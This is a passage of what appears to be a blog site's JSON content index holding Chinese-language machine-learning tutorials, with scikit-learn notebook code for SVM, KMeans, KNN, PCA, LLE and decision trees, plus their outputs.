svm Step2: 构建数据集并进行模型训练 1234567891011##Demo演示LogisticRegression分类## 构造数据集x_fearures = np.array([[-1, -2], [-2, -1], [-3, -2], [1, 3], [2, 1], [3, 2]])y_label = np.array([0, 0, 0, 1, 1, 1])## 调用SVC模型 （支持向量机分类）svc = svm.SVC(kernel=&#x27;linear&#x27;)## 用SVM模型拟合构造的数据集svc = svc.fit(x_fearures, y_label) Step3: 模型参数查看 12345## 查看其对应模型的wprint(&#x27;the weight of Logistic Regression:&#x27;,svc.coef_)## 查看其对应模型的w0print(&#x27;the intercept(w0) of Logistic Regression:&#x27;,svc.intercept_) the weight of Logistic Regression: [[0.33364706 0.33270588]] the intercept(w0) of Logistic Regression: [-0.00031373] Step4: 模型预测 123## 模型预测y_train_pred = svc.predict(x_fearures)print(&#x27;The predction result:&#x27;,y_train_pred) The predction result: [0 0 0 1 1 1] Step5: 模型可视化 由于此处选择的线性核函数，所以在此我们可以将 svm 进行可视化。 123456789101112# 最佳函数x_range = np.linspace(-3, 3)w = svc.coef_[0]a = -w[0] / w[1]y_3 = a*x_range - (svc.intercept_[0]) / w[1]# 可视化决策边界plt.figure()plt.scatter(x_fearures[:,0],x_fearures[:,1], c=y_label, s=50, cmap=&#x27;viridis&#x27;)plt.plot(x_range, y_3, &#x27;-c&#x27;)plt.show() ​ ​ 可以对照之前的逻辑回归模型的决策边界，我们可以发现两个决策边界是有一定差异的（可以对比两者在 X,Y 轴上的截距），这说明这两个不同在相同数据集上找到的判别线是不同的，而这不同的原因其实是由于两者选择的最优目标是不一致的。接下来我们进行 SVM 的一些简单介绍。 # 5 支持向量机介绍 我们常常会碰到这样的一个问题，首先给你一些分属于两个类别的数据 12345678import numpy as npimport matplotlib.pyplot as pltfrom sklearn.datasets import make_blobs%matplotlib inline# 画图X, y = make_blobs(n_samples=60, centers=2, random_state=0, cluster_std=0.4)plt.scatter(X[:, 0], X[:, 1], c=y, s=60, cmap=plt.cm.Paired) &lt;matplotlib.collections.PathCollection at 0x1d050096a58&gt; ​ ​ 现在需要一个线性分类器，将这些数据分开来。 我们可能会有多种分法： 1234567891011# 画散点图X, y = make_blobs(n_samples=60, centers=2, random_state=0, cluster_std=0.4)plt.scatter(X[:, 0], X[:, 1], c=y, s=50, cmap=plt.cm.Paired)x_fit = np.linspace(0, 3)# 画函数y_1 = 1 * x_fit + 0.8plt.plot(x_fit, y_1, &#x27;-c&#x27;)y_2 = -0.3 * x_fit + 3plt.plot(x_fit, y_2, &#x27;-k&#x27;) [&lt;matplotlib.lines.Line2D at 0x1d05011bf28&gt;] ​ ​ 那么现在有一个问题，两个分类器，哪一个更好呢？ 为了判断好坏，我们需要引入一个准则：好的分类器不仅仅是能够很好的分开已有的数据集，还能对未知数据集进行两个的划分。 假设，现在有一个属于红色数据点的新数据（3， 2.8） 123456789101112# 画散点图X, y = make_blobs(n_samples=60, centers=2, random_state=0, cluster_std=0.4)plt.scatter(X[:, 0], X[:, 1], c=y, s=50, cmap=plt.cm.Paired)plt.scatter([3], [2.8], c=&#x27;#cccc00&#x27;, marker=&#x27;&lt;&#x27;, s=100, cmap=plt.cm.Paired)x_fit = np.linspace(0, 3)# 画函数y_1 = 1 * x_fit + 0.8plt.plot(x_fit, y_1, &#x27;-c&#x27;)y_2 = -0.3 * x_fit + 3plt.plot(x_fit, y_2, &#x27;-k&#x27;) [&lt;matplotlib.lines.Line2D at 0x1d050163470&gt;] ​ ​ 可以看到，此时黑色的线会把这个新的数据集分错，而蓝色的线不会。 我们刚刚举的例子可能会带有一些主观性。 那么如何客观的评判两条线的健壮性呢？ 此时，我们需要引入一个非常重要的概念：最大间隔。 最大间隔刻画着当前分类器与数据集的边界，以这两个分类器为例： 123456789101112131415161718# 画散点图X, y = make_blobs(n_samples=60, centers=2, random_state=0, cluster_std=0.4)plt.scatter(X[:, 0], X[:, 1], c=y, s=50, cmap=plt.cm.Paired)x_fit = np.linspace(0, 3)# 画函数y_1 = 1 * x_fit + 0.8plt.plot(x_fit, y_1, &#x27;-c&#x27;)# 画边距plt.fill_between(x_fit, y_1 - 0.6, y_1 + 0.6, edgecolor=&#x27;none&#x27;, color=&#x27;#AAAAAA&#x27;, alpha=0.4)y_2 = -0.3 * x_fit + 3plt.plot(x_fit, y_2, &#x27;-k&#x27;)plt.fill_between(x_fit, y_2 - 0.4, y_2 + 0.4, edgecolor=&#x27;none&#x27;, color=&#x27;#AAAAAA&#x27;, alpha=0.4) &lt;matplotlib.collections.PolyCollection at 0x1d05021dba8&gt; ​ ​ 可以看到， 蓝色的线最大间隔是大于黑色的线的。 所以我们会选择蓝色的线作为我们的分类器。 12345678910# 画散点图X, y = make_blobs(n_samples=60, centers=2, random_state=0, cluster_std=0.4)plt.scatter(X[:, 0], X[:, 1], c=y, s=50, cmap=plt.cm.Paired)# 画图y_1 = 1 * x_fit + 0.8plt.plot(x_fit, y_1, &#x27;-c&#x27;)# 画边距plt.fill_between(x_fit, y_1 - 0.6, y_1 + 0.6, edgecolor=&#x27;none&#x27;, color=&#x27;#AAAAAA&#x27;, alpha=0.4) &lt;matplotlib.collections.PolyCollection at 0x1d0502606a0&gt; ​ ​ 那么，我们现在的分类器是最优分类器吗？ 或者说，有没有更好的分类器，它具有更大的间隔？ 答案是有的。 为了找出最优分类器，我们需要引入我们今天的主角：SVM 1234from sklearn.svm import SVC# SVM 函数clf = SVC(kernel=&#x27;linear&#x27;)clf.fit(X, y) SVC(kernel='linear') 1234567891011# 最佳函数w = clf.coef_[0]a = -w[0] / w[1]y_3 = a*x_fit - (clf.intercept_[0]) / w[1]# 最大边距 下届b_down = clf.support_vectors_[0]y_down = a* x_fit + b_down[1] - a * b_down[0]# 最大边距 上届b_up = clf.support_vectors_[-1]y_up = a* x_fit + b_up[1] - a * b_up[0] 12345678910# 画散点图X, y = make_blobs(n_samples=60, centers=2, random_state=0, cluster_std=0.4)plt.scatter(X[:, 0], X[:, 1], c=y, s=50, cmap=plt.cm.Paired)# 画函数plt.plot(x_fit, y_3, &#x27;-c&#x27;)# 画边距plt.fill_between(x_fit, y_down, y_up, edgecolor=&#x27;none&#x27;, color=&#x27;#AAAAAA&#x27;, alpha=0.4)# 画支持向量plt.scatter(clf.support_vectors_[:, 0], clf.support_vectors_[:, 1], edgecolor=&#x27;b&#x27;, s=80, facecolors=&#x27;none&#x27;) &lt;matplotlib.collections.PathCollection at 0x1d05031fa90&gt; ​ ​ 带黑边的点是距离当前分类器最近的点，我们称之为支持向量。 支持向量机为我们提供了在众多可能的分类器之间进行选择的原则，从而确保对未知数据集具有更高的泛化性。 # 3.2 软间隔 但很多时候，我们拿到的数据是这样子的 123# 画散点图X, y = make_blobs(n_samples=60, centers=2, random_state=0, cluster_std=0.9)plt.scatter(X[:, 0], X[:, 1], c=y, s=50, cmap=plt.cm.Paired) &lt;matplotlib.collections.PathCollection at 0x1d050383710&gt; ​ ​ 这种情况并不容易找到这样的最大间隔。 于是我们就有了软间隔，相比于硬间隔而言，我们允许个别数据出现在间隔带中。 我们知道，如果没有一个原则进行约束，满足软间隔的分类器也会出现很多条。 所以需要对分错的数据进行惩罚，SVC 函数中，有一个参数 C 就是惩罚参数。 惩罚参数越小，容忍性就越大。 以 C=1 为例子，比如说： 12345678910111213141516171819202122232425262728# 画散点图X, y = make_blobs(n_samples=60, centers=2, random_state=0, cluster_std=0.9)plt.scatter(X[:, 0], X[:, 1], c=y, s=50, cmap=plt.cm.Paired)# 惩罚参数：C=1 clf = SVC(C=1, kernel=&#x27;linear&#x27;)clf.fit(X, y)# 最佳函数w = clf.coef_[0]a = -w[0] / w[1]y_3 = a*x_fit - (clf.intercept_[0]) / w[1]# 最大边距 下届b_down = clf.support_vectors_[0]y_down = a* x_fit + b_down[1] - a * b_down[0]# 最大边距 上届b_up = clf.support_vectors_[-1]y_up = a* x_fit + b_up[1] - a * b_up[0]# 画散点图X, y = make_blobs(n_samples=60, centers=2, random_state=0, cluster_std=0.4)plt.scatter(X[:, 0], X[:, 1], c=y, s=50, cmap=plt.cm.Paired)# 画函数plt.plot(x_fit, y_3, &#x27;-c&#x27;)# 画边距plt.fill_between(x_fit, y_down, y_up, edgecolor=&#x27;none&#x27;, color=&#x27;#AAAAAA&#x27;, alpha=0.4)# 画支持向量plt.scatter(clf.support_vectors_[:, 0], clf.support_vectors_[:, 1], edgecolor=&#x27;b&#x27;, s=80, facecolors=&#x27;none&#x27;) &lt;matplotlib.collections.PathCollection at 0x1d0504224a8&gt; ​ ​ 惩罚参数 C=0.2 时，SVM 会更具包容性，从而兼容更多的错分样本： 12345678910111213141516171819202122232425262728X, y = make_blobs(n_samples=60, centers=2, random_state=0, cluster_std=0.9)plt.scatter(X[:, 0], X[:, 1], c=y, s=50, cmap=plt.cm.Paired)# 惩罚参数：C=0.2 clf = SVC(C=0.2, kernel=&#x27;linear&#x27;)clf.fit(X, y)x_fit = np.linspace(-1.5, 4)# 最佳函数w = clf.coef_[0]a = -w[0] / w[1]y_3 = a*x_fit - (clf.intercept_[0]) / w[1]# 最大边距 下届b_down = clf.support_vectors_[10]y_down = a* x_fit + b_down[1] - a * b_down[0]# 最大边距 上届b_up = clf.support_vectors_[1]y_up = a* x_fit + b_up[1] - a * b_up[0]# 画散点图X, y = make_blobs(n_samples=60, centers=2, random_state=0, cluster_std=0.4)plt.scatter(X[:, 0], X[:, 1], c=y, s=50, cmap=plt.cm.Paired)# 画函数plt.plot(x_fit, y_3, &#x27;-c&#x27;)# 画边距plt.fill_between(x_fit, y_down, y_up, edgecolor=&#x27;none&#x27;, color=&#x27;#AAAAAA&#x27;, alpha=0.4)# 画支持向量plt.scatter(clf.support_vectors_[:, 0], clf.support_vectors_[:, 1], edgecolor=&#x27;b&#x27;, s=80, facecolors=&#x27;none&#x27;) &lt;matplotlib.collections.PathCollection at 0x1d05049e390&gt; ​ ​ # 3.3 超平面 如果我们遇到这样的数据集，没有办法利用线性分类器进行分类 1234567891011121314from sklearn.datasets import make_circles# 画散点图X, y = make_circles(100, factor=.1, noise=.1, random_state=2019)plt.scatter(X[:, 0], X[:, 1], c=y, s=50, cmap=plt.cm.Paired)clf = SVC(kernel=&#x27;linear&#x27;).fit(X, y)# 最佳函数x_fit = np.linspace(-1.5, 1.5)w = clf.coef_[0]a = -w[0] / w[1]y_3 = a*X - (clf.intercept_[0]) / w[1]plt.plot(X, y_3, &#x27;-c&#x27;) [&lt;matplotlib.lines.Line2D at 0x1d050524dd8&gt;, &lt;matplotlib.lines.Line2D at 0x1d050524e80&gt;] ​ ​ 我们可以将二维（低维）空间的数据映射到三维（高维）空间中。 此时，我们便可以通过一个超平面对数据进行划分 所以，我们映射的目的在于使用 SVM 在高维空间找到超平面的能力。 123456789101112# 数据映射r = np.exp(-(X[:, 0] ** 2 + X[:, 1] ** 2))ax = plt.subplot(projection=&#x27;3d&#x27;)ax.scatter3D(X[:, 0], X[:, 1], r, c=y, s=50, cmap=plt.cm.Paired)ax.set_xlabel(&#x27;x&#x27;)ax.set_ylabel(&#x27;y&#x27;)ax.set_zlabel(&#x27;z&#x27;)x_1, y_1 = np.meshgrid(np.linspace(-1, 1), np.linspace(-1, 1))z = 0.01*x_1 + 0.01*y_1 + 0.5ax.plot_surface(x_1, y_1, z, alpha=0.3) &lt;mpl_toolkits.mplot3d.art3d.Poly3DCollection at 0x1d050564978&gt; ​ ​ 在 SVC 中，我们可以用高斯核函数来实现这以功能：kernel=‘rbf’ 1234567891011121314151617181920# 画图X, y = make_circles(100, factor=.1, noise=.1, random_state=2019)plt.scatter(X[:, 0], X[:, 1], c=y, s=50, cmap=plt.cm.Paired)clf = SVC(kernel=&#x27;rbf&#x27;)clf.fit(X, y)ax = plt.gca()x = np.linspace(-1, 1)y = np.linspace(-1, 1)x_1, y_1 = np.meshgrid(x, y)P = np.zeros_like(x_1)for i, xi in enumerate(x): for j, yj in enumerate(y): P[i, j] = clf.decision_function(np.array([[xi, yj]]))ax.contour(x_1, y_1, P, colors=&#x27;k&#x27;, levels=[-1, 0, 0.9], alpha=0.5, linestyles=[&#x27;--&#x27;, &#x27;-&#x27;, &#x27;--&#x27;])plt.scatter(clf.support_vectors_[:, 0], clf.support_vectors_[:, 1], edgecolor=&#x27;b&#x27;, s=80, facecolors=&#x27;none&#x27;); ​ ​ 此时便完成了非线性分类。","categories":[{"name":"天池机器学习入门","slug":"天池机器学习入门","permalink":"http://example.com/categories/%E5%A4%A9%E6%B1%A0%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E5%85%A5%E9%97%A8/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"KMeans","slug":"机器学习/机器学习课程(魏)/KMeans","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:49:07.736Z","comments":true,"path":"2021/11/08/机器学习/机器学习课程(魏)/KMeans/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/KMeans/","excerpt":"","text":"1234from sklearn.datasets import make_blobsimport matplotlib.pyplot as pltfrom sklearn.cluster import KMeansimport numpy as np 1234567891011121314151617181920212223#创建数据#make_blobs 聚类生成器x, y_true = make_blobs(n_samples = 1000, #生成1000条数据 centers =5, #5类数据 cluster_std = 0.5, #方差一致 random_state = 9) #随机数种子#x.shape #(300, 2)plt.figure()plt.scatter(x[:,0], x[:,1])model = KMeans(n_clusters=5)#n_clusters是kmodel.fit(x)y_kmeans = model.predict(x)plt.figure()plt.scatter(x[:,0], x[:,1], c = y_kmeans, cmap=&#x27;Dark2&#x27;, s=50, alpha=0.5, marker=&#x27;o&#x27;)centroids = model.cluster_centers_plt.scatter(centroids[:,0], centroids[:,1],c=[0,1,2,3,4],cmap=&#x27;Dark2&#x27;,s=250, marker=&#x27;*&#x27;)plt.title(&#x27;K-means 1000 points&#x27;)plt.xlabel(&#x27;Value1&#x27;)plt.ylabel(&#x27;Value2&#x27;)plt.show() ​ ​ 123456789101112131415161718192021222324252627282930x, y_true = make_blobs(n_samples = 1000, #生成300条数据 centers = 2, #5类数据 cluster_std = 0.6, #方差一致 random_state = 8) #随机数种子x.shape #(300, 2)plt.figure()plt.scatter(x[:,0], x[:,1],c=y_true,s=10, alpha=0.8)model = KMeans(n_clusters =2)model.fit(x)xmin,xmax=x[:,0].min()-1,x[:,0].max()+1ymin,ymax=x[:,1].min()-1,x[:,1].max()+1x1,y1=np.meshgrid(np.arange(xmin,xmax,0.1),np.arange(ymin,ymax,0.02))z=model.predict(np.c_[x1.ravel(),y1.ravel()])z=z.reshape(x1.shape)y_kmeans = model.predict(x)plt.figure()plt.pcolormesh(x1,y1,z,cmap=plt.cm.Pastel1,shading=&#x27;auto&#x27;,)plt.scatter(x[:,0], x[:,1], c = y_kmeans, cmap=&#x27;Dark2&#x27;, s=50, alpha=0.5, marker=&#x27;x&#x27;)centroids = model.cluster_centers_plt.scatter(centroids[:,0], centroids[:,1],c=[0,1],cmap=&#x27;Dark2&#x27;,s=70, marker=&#x27;o&#x27;)plt.title(&#x27;K-means 1000 points&#x27;)plt.xlabel(&#x27;Value1&#x27;)plt.ylabel(&#x27;Value2&#x27;)plt.show()n=10dis=np.zeros([n,n])for i in range(n): distances = np.sqrt(np.sum(np.asarray(centroids[i,:] - centroids)**2, axis=1)) dis[i,:]=distances ​ ​ --------------------------------------------------------------------------- ValueError Traceback (most recent call last) &lt;ipython-input-6-73969d6b1829&gt; in &lt;module&gt; 27 for i in range(n): 28 distances = np.sqrt(np.sum(np.asarray(centroids[i,:] - centroids)**2, axis=1)) ---&gt; 29 dis[i,:]=distances ValueError: could not broadcast input array from shape (2) into shape (10) 1","categories":[{"name":"机器学习课程(魏)","slug":"机器学习课程-魏","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E9%AD%8F/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"KNN","slug":"机器学习/机器学习课程(魏)/KNN","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:49:32.165Z","comments":true,"path":"2021/11/08/机器学习/机器学习课程(魏)/KNN/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/KNN/","excerpt":"","text":"12345from sklearn.datasets import make_blobs #调用生成数据函数from sklearn.neighbors import KNeighborsClassifier #调用KNN分类器函数import matplotlib.pyplot as pltimport numpy as npfrom scipy.io import loadmat 123456789101112131415161718data=make_blobs(n_samples=1000,n_features=2,centers=5,random_state=1)#生成数据x,y=data #x获取数据的横轴和纵轴坐标，y获取数据的类别(标签)plt.figure()#产生一个画布plt.scatter(x[:,0],x[:,1],c=y,cmap=plt.cm.spring,edgecolor=&#x27;k&#x27;)#x[:,0]数据的横轴、x[:,1]数据的纵轴 #c:颜色；cm.spring数据点的可视化风格；edgecolor数据点的边界颜色。model=KNeighborsClassifier()#生成一个初始化的knn分类器模型model.fit(x,y)#对初始化的knn分类器进行训练（用现有的训练样本进行训练）xmin,xmax=x[:,0].min()-1,x[:,0].max()+1#获取训练样本横轴坐标的最小值和最大值ymin,ymax=x[:,1].min()-1,x[:,1].max()+1#获取训练样本纵轴坐标的最小值和最大值x1,y1=np.meshgrid(np.arange(xmin,xmax,0.02),np.arange(ymin,ymax,0.02))#对整个训练样本数据的分布空间进行网格化z=model.predict(np.c_[x1.ravel(),y1.ravel()])#对空间数据进行分类z=z.reshape(x1.shape)#对分类后的数据进行变形（从一维变到二维）plt.figure()#产生一个画布plt.pcolormesh(x1,y1,z,cmap=plt.cm.Pastel1)plt.scatter(x[:,0],x[:,1],c=y,cmap=plt.cm.spring,edgecolor=&#x27;k&#x27;)plt.show() c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:16: MatplotlibDeprecationWarning: shading='flat' when X and Y have the same dimensions as C is deprecated since 3.3. Either specify the corners of the quadrilaterals with X and Y, or pass shading='auto', 'nearest' or 'gouraud', or set rcParams['pcolor.shading']. This will become an error two minor releases later. app.launch_new_instance() 12345678910mnist=loadmat(&#x27;mnist-original.mat&#x27;)x,y=mnist[&quot;data&quot;],mnist[&quot;label&quot;]x=x.Ty=y[0]some_digit=x[69000]x_train=x[:60000]y_train=y[:60000]model=KNeighborsClassifier()model.fit(x_train,y_train)print(model.predict([some_digit])) [9.] 1","categories":[{"name":"机器学习课程(魏)","slug":"机器学习课程-魏","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E9%AD%8F/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"SVM","slug":"机器学习/机器学习课程(魏)/SVM","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:49:51.977Z","comments":true,"path":"2021/11/08/机器学习/机器学习课程(魏)/SVM/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/SVM/","excerpt":"","text":"12345678910111213141516171819202122232425262728293031323334353637383940414243import numpy as npimport pandas as pdimport matplotlib.pyplot as pltfrom mpl_toolkits.mplot3d import Axes3D xs=np.arange(-5,5,0.2)ys1=np.sqrt(25-xs*xs)+np.random.uniform(-0.5,0.5,(xs.shape[0]))ys2=-1*np.sqrt(25-xs*xs)+np.random.uniform(-0.5,0.5,(xs.shape[0]))xys1=np.c_[xs,ys1]xys2=np.c_[xs,ys2]xy1=np.r_[xys1,xys2]xh=np.arange(-8,8,0.2)yh1=np.sqrt(64-xh*xh)+np.random.uniform(-0.5,0.5,(xh.shape[0]))yh2=-1*np.sqrt(64-xh*xh)+np.random.uniform(-0.5,0.5,(xh.shape[0]))xyh1=np.c_[xh,yh1]xyh2=np.c_[xh,yh2]xy2=np.r_[xyh1,xyh2]xy3=np.r_[xy1,xy2]plt.figure()plt.scatter(xy3[0:100,0],xy3[0:100,1],c=&#x27;k&#x27;,marker=&#x27;*&#x27;)plt.scatter(xy3[100:,0],xy3[100:,1],c=&#x27;r&#x27;,marker=&#x27;o&#x27;)fig=plt.figure()ax=Axes3D(fig)z1=xy3[:,0]**2z2=xy3[:,1]**2z3=xy3[:,1]ax.scatter(z1[0:100],z2[0:100],z3[0:100],c=&#x27;k&#x27;,marker=&#x27;*&#x27;)ax.scatter(z1[100:],z2[100:],z3[100:],c=&#x27;r&#x27;,marker=&#x27;o&#x27;)plt.show() c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:34: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6. This is consistent with other Axes classes. 1234567891011121314151617181920212223242526import numpy as npimport pandas as pdfrom sklearn.datasets import make_moonsimport matplotlib.pyplot as pltfrom sklearn import svmfrom sklearn.model_selection import cross_val_score as cr#调用交叉检验函数n_samples = 600x,y=make_moons(n_samples=n_samples, noise=0.1,random_state=3)clf=svm.SVC(kernel=&#x27;rbf&#x27;,gamma=0.5,C=100)#poly代表分类线是曲线，degree是曲线的最高次幂clf.fit(x,y)#clf.predict([x])xmin,xmax=x[:,0].min()-1,x[:,0].max()+1ymin,ymax=x[:,1].min()-1,x[:,1].max()+1xx,yy=np.meshgrid(np.arange(xmin,xmax,0.02),np.arange(ymin,ymax,0.02))xf=np.c_[xx.ravel(),yy.ravel()];z=clf.predict(xf)z=z.reshape(xx.shape)plt.pcolormesh(xx,yy,z,cmap=plt.cm.Pastel1)plt.scatter(x[:,0],x[:,1],c=y)print(cr(clf,x,y,cv=5,scoring=&quot;accuracy&quot;))plt.show() [1. 0.99166667 1. 1. 1. ] c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:20: MatplotlibDeprecationWarning: shading='flat' when X and Y have the same dimensions as C is deprecated since 3.3. Either specify the corners of the quadrilaterals with X and Y, or pass shading='auto', 'nearest' or 'gouraud', or set rcParams['pcolor.shading']. This will become an error two minor releases later. 1","categories":[{"name":"机器学习课程(魏)","slug":"机器学习课程-魏","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E9%AD%8F/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"主成分分析","slug":"机器学习/机器学习课程(魏)/主成分分析","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:52:36.475Z","comments":true,"path":"2021/11/08/机器学习/机器学习课程(魏)/主成分分析/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E4%B8%BB%E6%88%90%E5%88%86%E5%88%86%E6%9E%90/","excerpt":"","text":"# 对数据降维后使用 KNN 算法进行分类的案例 123456789101112131415161718192021222324252627from scipy.io import loadmatimport numpy as npfrom sklearn.neighbors import KNeighborsClassifierimport picklefrom sklearn.decomposition import PCAmnist=loadmat(&#x27;mnist-original.mat&#x27;)#获取原始数据x,y=mnist[&quot;data&quot;],mnist[&quot;label&quot;]#分别获取原始数据的数据描述和数据标签x=x.T#对原始数据描述进行转转置y=y[0]pca=PCA()#建立PCA模型pca.fit(x)#通过PCA（主成分分析）对原始数据进行主成分分析,得到特征值和特征向量cumsum=np.cumsum(pca.explained_variance_ratio_)#对特征值进行排序（从大到小进行排序），计算特征值的累计贡献率d=np.argmax(cumsum&gt;=0.95)+1 #设定一个累计贡献率的阈值，阈值为0.95，d是累计贡献率达到0.95的特征值的数量，d=154pca=PCA(n_components=d)#对原始数据进行降维，从784维降到154维x1=pca.fit_transform(x)#x1是降维之后的数据x_train=x1[:60000]#选择训练数据，原始数据有70000条，我们选择前60000作为训练样本，x_train代表前60000个样本的数据描述y_train=y[:60000]#前60000个样本的标签shuffle_index=np.random.permutation(60000)#对前60000个数据打乱顺序x_train=x_train[shuffle_index]y_train=y_train[shuffle_index]sgd_clf=KNeighborsClassifier()#调用KNN分类器sgd_clf.fit(x_train,y_train)#建立KNN分类器模型print(d)with open(&#x27;clf.pickle&#x27;, &#x27;wb&#x27;) as f: pickle.dump(sgd_clf, f) 154 1234567891011121314151617181920from scipy.io import loadmatimport numpy as npimport picklefrom sklearn.decomposition import PCAfrom sklearn.metrics import accuracy_scoremnist=loadmat(&#x27;mnist-original.mat&#x27;)x,y=mnist[&quot;data&quot;],mnist[&quot;label&quot;]x=x.Ty=y[0]pca=PCA(n_components=154)x1=pca.fit_transform(x)some_digit=x1[66000]x_test=x[60000:]y_test=y[60000:]with open(&#x27;clf.pickle&#x27;, &#x27;rb&#x27;) as f: clf2 = pickle.load(f)y_pred = clf2.predict(x1[60000:])print(accuracy_score(y[60000:], y_pred)) 0.9719 # LLE 1234567891011121314151617181920import numpy as npimport matplotlib.pyplot as pltfrom mpl_toolkits.mplot3d import Axes3Dfrom sklearn.manifold import LocallyLinearEmbeddingN=2000angle=np.pi*(1.5*np.random.random(int(N/2))-1)height=5*np.random.random(N)x=np.array([np.append(np.cos(angle),-1*np.cos(angle)),height,np.append(np.sin(angle),2-np.sin(angle))])x=x.Tfig=plt.figure()ax=Axes3D(fig)ax.scatter(x[:,0],x[:,1],x[:,2])lle=LocallyLinearEmbedding(n_components=2,n_neighbors=12)#n_neighbors不能太小，也不能太大#如果太小结果不理想，如果太大，则效果接近于PCA（主成分分析），原论文推荐是12x2d=lle.fit_transform(x)plt.figure()plt.plot(x2d[:,0],x2d[:,1],&#x27;k.&#x27;)plt.show() c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:12: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6. This is consistent with other Axes classes. if sys.path[0] == '':","categories":[{"name":"机器学习课程(魏)","slug":"机器学习课程-魏","permalink":"http://example.com/categories/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B-%E9%AD%8F/"}],"tags":[{"name":"机器学习","slug":"机器学习","permalink":"http://example.com/tags/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/"}]},{"title":"决策树","slug":"机器学习/机器学习课程(魏)/决策树","date":"2021-11-08T07:02:54.000Z","updated":"2021-12-08T08:50:38.052Z","comments":true,"path":"2021/11/08/机器学习/机器学习课程(魏)/决策树/","link":"","permalink":"http://example.com/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E8%AF%BE%E7%A8%8B(%E9%AD%8F)/%E5%86%B3%E7%AD%96%E6%A0%91/","excerpt":"","text":"12345678910111213141516import numpy as npfrom scipy.io import loadmatimport matplotlib.pyplot as pltfrom sklearn.tree import DecisionTreeClassifiermnist=loadmat(&#x27;mnist-original.mat&#x27;)x,y=mnist[&quot;data&quot;],mnist[&quot;label&quot;]x=x.Ty=y[0]some_digit=x[68888]x_train=x[:60000]y_train=y[:60000]model=DecisionTreeClassifier(max_depth=10)model.fit(x_train,y_train)print(model.predict([some_digit])) [8.] 12345678910111213141516171819202122232425import numpy as npfrom sklearn.datasets import make_moonsimport matplotlib.pyplot as pltfrom sklearn.model_selection import cross_val_score as cr#调用交叉检验函数from sklearn.tree import DecisionTreeClassifiern_samples = 600x,y=make_moons(n_samples=n_samples, noise=.1,random_state=8)model=DecisionTreeClassifier(criterion=&#x27;gini&#x27;,max_depth=15)model.fit(x,y)#clf.predict([x])xmin,xmax=x[:,0].min()-1,x[:,0].max()+1ymin,ymax=x[:,1].min()-1,x[:,1].max()+1xx,yy=np.meshgrid(np.arange(xmin,xmax,0.02),np.arange(ymin,ymax,0.02))xf=np.c_[xx.ravel(),yy.ravel()];z=model.predict(xf)z=z.reshape(xx.shape)plt.pcolormesh(xx,yy,z,cmap=plt.cm.Pastel1)plt.scatter(x[:,0],x[:,1],c=y)print(cr(model,x,y,cv=5,scoring=&quot;accuracy&quot;))plt.show() [0.99166667 1. 0.98333333 0.98333333 0.98333333] c:\\users\\administrator\\appdata\\local\\programs\\python\\python37\\lib\\site-packages\\ipykernel_launcher.py:19: MatplotlibDeprecationWarning: shading='flat' when X and Y have the same dimensions as C is deprecated since 3.3. Either specify the corners of the quadrilaterals with X and Y, or pass shading='auto', 'nearest' or 'gouraud', or set rcParams['pcolor.shading']. This will become an error two minor releases later. 12345678910111213141516171819from sklearn.datasets import load_irisfrom sklearn.tree import DecisionTreeClassifierfrom sklearn.tree import 